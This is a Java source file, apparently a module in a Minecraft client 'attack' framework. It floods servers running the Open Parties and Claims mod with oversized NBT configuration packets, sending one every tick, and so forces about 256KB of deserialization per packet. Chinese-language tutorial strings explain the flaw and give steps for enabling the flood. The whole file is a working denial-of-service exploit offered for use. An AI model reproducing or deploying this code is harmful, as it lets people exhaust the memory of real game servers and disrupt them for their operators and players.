package com.redblue.red.modules.opac;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * OPAC-05: Config Packet Memory Pressure -- exploits the 256KB size limit
 * on ServerboundPlayerConfigOptionValuePacket (index 32).
 *
 * The codec allows up to 262144 bytes and 512 entries in the ListTag,
 * even though the handler only processes 1 entry. The server still
 * deserializes the full NBT before rejecting extra entries.
 *
 * Sending max-size packets rapidly forces server-side NBT deserialization
 * of ~256KB per packet, creating memory allocation pressure.
 *
 * Non-OP players can only set PLAYER type configs with their own UUID,
 * so the handler will process the first entry then discard the rest,
 * but deserialization cost is already paid.
 */
public class OPAC05_ConfigMemPressure implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("openpartiesandclaims", "main");
    private static final int IDX_CONFIG_VALUE = 32;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "确认: 大量内存分配可能影响服务器", false),
        ConfigParam.ofInt("entry_count", "NBT条目数", 512, 1, 512),
        ConfigParam.ofInt("string_len", "字符串填充长度", 400, 10, 1000),
        ConfigParam.ofInt("interval", "发包间隔 (tick)", 1, 1, 20)
    );

    @Override public String id() { return "opac05_config_mem"; }
    @Override public String name() { return "配置包内存压力"; }
    @Override public String description() { return "发送最大尺寸配置包迫使服务器反序列化256KB NBT"; }

    @Override
    public String getTutorial() {
        return "[原理]\n"
            + "ServerboundPlayerConfigOptionValuePacket 编解码器允许256KB\n"
            + "ListTag最多512条目，每条含最长1000字符的字符串\n"
            + "服务端必须完整反序列化NBT后才能检查条目数量\n"
            + "handler只处理1条但反序列化开销已经产生\n\n"
            + "[使用方法]\n"
            + "1. 勾选确认复选框\n"
            + "2. 启用模块自动发送\n\n"
            + "[参数]\n"
            + "NBT条目数: 每个包中的条目数量(最大512)\n"
            + "字符串填充长度: 每个条目的选项ID长度";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("openpartiesandclaims");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;
        sendConfigPacket(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        sendConfigPacket(mc);
    }

    private void sendConfigPacket(Minecraft mc) {
        int entryCount = getParam("entry_count").map(ConfigParam::getInt).orElse(512);
        int strLen = getParam("string_len").map(ConfigParam::getInt).orElse(400);

        // Build padding string
        StringBuilder sb = new StringBuilder(strLen);
        for (int i = 0; i < strLen; i++) sb.append('x');
        String padding = sb.toString();

        CompoundTag root = new CompoundTag();
        root.putString("t", "PLAYER");
        root.putBoolean("co", true); // currentOwner = true -> owner = self

        ListTag entries = new ListTag();
        for (int i = 0; i < entryCount; i++) {
            CompoundTag entry = new CompoundTag();
            entry.putString("i", padding + i); // option ID (up to 1000 chars)
            entry.putString("v", padding);      // value as string
            entry.putBoolean("m", true);
            entry.putBoolean("d", false);
            entries.add(entry);
        }
        root.put("e", entries);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_CONFIG_VALUE);
            buf.writeNbt(root);
        });
    }
}
